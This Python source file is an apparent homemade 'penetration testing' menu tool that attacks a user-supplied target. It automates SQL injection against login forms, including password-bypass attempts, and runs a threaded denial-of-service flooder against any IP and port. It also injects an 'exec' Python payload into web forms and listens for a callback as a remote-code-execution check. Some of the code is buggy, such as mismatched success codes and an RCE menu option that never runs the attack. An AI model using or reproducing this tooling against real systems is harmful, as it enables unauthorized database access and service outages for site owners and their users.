import mechanize
import os
from dotenv import load_dotenv
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import subprocess
import socket
import threading
import datetime

#load_dotenv()

#Retreive Env Variables
#email_acc = os.getenv("EMAILACC")
#email_pass = os.getenv("EMAILPASS")
#email_port = os.getenv("EMAILPORT")


def fill_form(url, field_value,reportFile):
    # Create a Browser instance
    br = mechanize.Browser()
    #Deal with file
    try:
        # Try opening the file in write mode
        reportFileObj = open(reportFile, "a+")  # "a+" mode opens for reading and appending; creates file if not exists
        print("File opened successfully.")
    except FileNotFoundError:
        # If the file doesn't exist, create it
        reportFileObj = open(reportFile, "w+")  # "w+" mode creates or truncates file for reading and writing
        print("File created successfully.")
    try:
        # Open the URL
        br.open(url)
        # Find the first form on the page
        for form in br.forms():
            # Iterate over form controls
            for control in form.controls:
                # Check if the control is a text input
                if isinstance(control, mechanize.TextControl):
                    # Set the value for the first text input field found
                    control.value = field_value
                    # Submit the form
                    br.form = form
                    br.submit()
                    # Write the response content to the file
                    reportFileObj.write(br.response().read())
                    print("Response saved to", reportFile)
                    return  # Exit the function after processing the first form
        print("No text input field found in any form.")
        print("Make sure you have the correct URL")
    except mechanize.HTTPError as e:
        # Handle HTTPError, which occurs when the URL fails to open
        print("Failed to open URL:", e)


def fill_formP(url, field_value, reportFile, userName):
    # Create a Browser instance
    br = mechanize.Browser()

    try:
        # Try opening the file in append mode
        with open(reportFile, "a+") as reportFileObj:
            print("File opened successfully.")
    except FileNotFoundError:
        # If the file doesn't exist, create it
        with open(reportFile, "w+") as reportFileObj:
            print("File created successfully.")

    try:
        # Open the URL
        br.open(url)

        # Find the first form on the page
        for form in br.forms():
            # Iterate over form controls
            for i, control in enumerate(form.controls):
                # Check if the control is a text input
                if isinstance(control, mechanize.TextControl):
                    # Set the value for the first text input field found
                    if i == 1:  # This accesses the second form aka Pass
                        control.value = field_value
                    if i == 0:
                        control.value = userName # This pushes the user name
            # Submit the form after setting the value
            br.form = form
            br.submit()

            # Write the response content to the file
            reportFileObj.write(br.response().read())
            print("Response saved to", reportFile)

            return  # Exit the function after processing the first form

        print("No text input field found in any form.")
        print("Make sure you have the correct URL")
    except mechanize.HTTPError as e:
        # Handle HTTPError, which occurs when the URL fails to open
        print("Failed to open URL:", e)
def fill_formAll(url, field_value,reportFile):
    # Deal with file
    try:
        # Try opening the file in write mode
        reportFileObj = open(reportFile, "a+")  # "a+" mode opens for reading and appending; creates file if not exists
        print("File opened successfully.")
    except FileNotFoundError:
        # If the file doesn't exist, create it
        reportFileObj = open(reportFile, "w+")  # "w+" mode creates or truncates file for reading and writing
        print("File created successfully.")
    try:
        # Create a Browser instance
        br = mechanize.Browser()
        # Open the URL
        br.open(url)
        # Iterate over all forms on the page
        for form in br.forms():
            # Iterate over all controls in the form
            for control in form.controls:
                # Check if the control is a text input
                if isinstance(control, mechanize.TextControl):
                    # Set the value for the text input field
                    control.value = field_value
        # Submit the form
        response = br.submit()
        reportFileObj.write(br.response().read())
        print("Response saved to", reportFile)
    except mechanize.HTTPError as e:
        # Handle HTTPError, which occurs when the URL fails to open
        print("Failed to open URL:", e)
def RCEReciever(UserIP,UserPort):
    #create socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        #bind socket
        s.bind((UserIP, UserPort))
        #Set a time out for the socket
        #30 seconds time out
        s.settimeout(30)
        try:
            #listen for response from server
            s.listen()
            #accept connection
            conn, addr = s.accept()
            with conn:
                print("Connected by", addr)
                print("At time ",datetime.datetime.now())
                data = conn.recv(1024)
                print("Received data from ", addr)
                print("Data: ",data.decode())
                #return succesful RCE number
                return 104
        except socket.timeout:
            print("Timeout : No connection made")
            #return failure number
            return 86

def RCEAttack(TargetURL, UserIP, UserPort, Report):
    #Make the remote code payload
    attackCodestring = '''
    import socket

    # Define the host and port to ping
    HOST = '127.0.0.1'  # localhost
    PORT = 12345        # Same port number used in the receiver script

    # Create a socket object
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Connect to the server
        s.connect((HOST, PORT))

        # Send a ping message
        message = "Ping!"
        s.sendall(message.encode())
        print("Ping sent to", HOST)
    '''
    attackCMDString = 'exec '
    totalAttackString = attackCMDString + attackCodestring
    #Now get the website
    br = mechanize.Browser()
    br.open(TargetURL)
    #go through the forms
    for form in br.forms():
        #find text field for our attack
        if any(isinstance(control, mechanize.TextControl) for control in form.controls):
            #now input the attack string into the text box
            for control in form.controls:
                if isinstance(control, mechanize.TextControl):
                    control.value = totalAttackString
                    break
            br.submit()
            print("Submitted Code String awaiting response")
            break
    else:
        print("No form with a text input field found on the page.")
    passfail = RCEReciever(UserIP,UserPort)
    #Open the report
    with open(Report, "a+") as reportFileObj:
        #This Means RCE succeded
        if passfail == 108:
            reportFileObj.write("Remote Code Execution Successful")
        if passfail == 86:
            reportFileObj.write("Remote Code Execution Failed")

def send_email(sender_email, receiver_email, password, smtp_server, subject, body):
    # Create a MIMEText object to represent the email content
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    # Add the body of the email
    message.attach(MIMEText(body, "plain"))

    # Establish a connection with the SMTP server
    server = smtplib.SMTP(smtp_server, 587)  # Use 587 as the default port for TLS connection
    server.starttls()  # Secure the connection

    try:
        # Login to the email account
        server.login(sender_email, password)

        # Send the email
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")
    finally:
        # Close the SMTP server session
        server.quit()
def simple_dos(targetIP, targetPort,AttackNum ,reportFile):
    threads = []
    startTime = datetime.datetime.now()
    #Commence Attack
    for i in range(AttackNum):
        thread = threading.Thread(target=dosAttack,args=(targetIP,targetPort))
        thread.start()
        threads.append(thread)
    #wait for all threads to finish
    for thread in threads:
        thread.join()
    #get finish time
    endTime = datetime.datetime.now()
    tot = endTime - startTime
    #print report
    with open(reportFile, "a") as file:
        file.write(f"Attack Response: started: {startTime} ended: {endTime} Amount: {AttackNum} Time Taken: {tot}\n")

def dosAttack(target, port):
    while True:
        #connect to the server
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            #Send a packet
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            #close connection
            s.close()
            #then repeat until an exception
        except Exception as e:
            break
            #exception breaks the while true and lets threads return
def main():
    #basic opening
    print("Welcome to the Penetration Testing Software")
    #Set this so the menu can start
    # essentially do while
    userChoice = 1
    #Build necessary list/dictionaries and other variables

    print("Retrieving data from files")
    #First the SQL commands to test
    try:
        with open("SQLSingleAttacks.txt", "r") as file:
            SQLAttackListSingle = file.readlines()
            #then strip out the new lines
            SQLAttackListSingle = [string.strip() for string in SQLAttackListSingle]
            #opened and succesful
            print("Retrieved SQL Command List from File for single field attacks")
    except FileNotFoundError:
        #No File found
        print("File Not found or not created")
        print("please use the following tool to create the file or download the file")
        subprocess.run(["python", "PenSetup.py"])
        print("Now sending you back to default menu")
    try:
        with open("SQLDoubleAttacks.txt", "r") as file:
            SQLAttackListDouble = file.readlines()
            # then strip out the new lines
            SQLAttackListDouble = [string.strip() for string in SQLAttackListDouble]
            # opened and succesful
            print("Retrieved SQL Command List from File for multiple field attacks")
    except FileNotFoundError:
        # No File found
        print("File Not found or not created")
        print("please use the following tool to create the file or download the file")
        subprocess.run(["python", "PenSetup.py"])
        print("Now sending you back to default menu")
    try:
        with open("SQLBatchAttacks.txt", "r") as file:
            SQLAttackListBatch = file.readlines()
            # then strip out the new lines
            SQLAttackListBatch = [string.strip() for string in SQLAttackListBatch]
            # opened and succesful
            print("Retrieved SQL Command List from File for Batch Style Attacks")
    except FileNotFoundError:
        # No File found
        print("File Not found or not created")
        print("please use the following tool to create the file or download the file")
        subprocess.run(["python", "PenSetup.py"])
        print("Now sending you back to default menu")

    #The menu and cycle
    while userChoice != 0:
        print("Choice Menu")
        print("1: Login Page SQL Injection Single Form Entry")
        print("2: Login Page SQL Injection Multiple Form Entry")
        print("3: SQL Injection Batched Statements")
        print("4: Password Injection Bypassing")
        print("5: Simple DoS Script")
        print("6: Remote Code Execution")
        #print("5: Phishing Email Spammer")
        print("9: Edit automation files")
        print("0: Exit Menu and End Program")
        userChoice = int(input("Please enter an integer: "))
        #This is the single form entry
        #These are SQL Attacks that only need something to happen once
        #There are a few forms of this attack in the basic txt for this
        #1) JunkID OR 1=1 to create the statement to always be truthful and always go through
        #2) "--" where you use the "--" to comment out the rest of the query as that is the comment indicator
        if userChoice == 1:
            print("SQL Injection Single Form function started")
            userUrl = input("Please enter the Login Page URL: ")
            reportFile = input("Please enter the Report Save Location: ")
            for SQLCommand in SQLAttackListSingle:
                # Example usage
                #url = "http://example.com/form"
                #field_name = "username"
                #field_value = "your_username"
                fill_form(userUrl,SQLCommand,reportFile)
        #these are SQL injection attacks where you can bypass things by changing things to always be true in the command throughout
        # " or ""=" - creates an sql command that is similar to the above of always being true
        # but allows you to go farther through the command compared to before
        if userChoice == 2:
            print("SQL Injection multiple form function started")
            userUrl = input("Please enter the Login Page URL: ")
            reportFile = input("Please enter the Report Save Location: ")
            for SQLCommandDouble in SQLAttackListDouble:
                fill_formAll(userUrl,SQLCommandDouble,reportFile)
        #these are a form of SQL injection where you use ; to end a command and start your own instead
        # JunkID; SELECT * FROM Users
        if userChoice == 3:
            print("SQL Injection Batched Statements function started")
            userUrl = input("Please enter the Login Page URL: ")
            reportFile = input("Please enter the Report Save Location: ")
            for SQLCommandBatch in SQLAttackListBatch:
                fill_form(userUrl,SQLCommandBatch,reportFile)
        if userChoice == 4:
            print("Password Bypassing via Injection")
            userUrl = input("Please enter the Login Page URL: ")
            reportFile = input("Please enter the Report Save Location: ")
            userNameH = input("Please enter the user's password to bypass: ")
            for SQLCommand in SQLAttackListSingle:
                fill_formP(userUrl,SQLCommand,reportFile,userNameH)
        if userChoice == 5:
            print("DDoS style Test")
            userIP = input("Please enter the IP address: ")
            userPort = input("Please enter the Port #: ")
            attackNum = int(input("Please Enter number of attacks to send: "))
            reportFile = input("Please enter the Report Save Location: ")
            simple_dos(userIP,userPort, attackNum,reportFile)
        if userChoice == 6:
            print("RCE Input Test")
            TargetUrl = input("Please enter the target URL: ")
            reportFile = input("Please enter the Report Save Location: ")
            userIP = input("Please enter your IP Address: ")
            userPort = input("Please enter an open port number for listening: ")
        if userChoice == 9:
            subprocess.run(["python", "PenSetup.py"])

    print("Thank you for using the penetration testing tool")

# Check if this script is being run directly (not imported as a module)
if __name__ == "__main__":
    # Call the main function
    main()
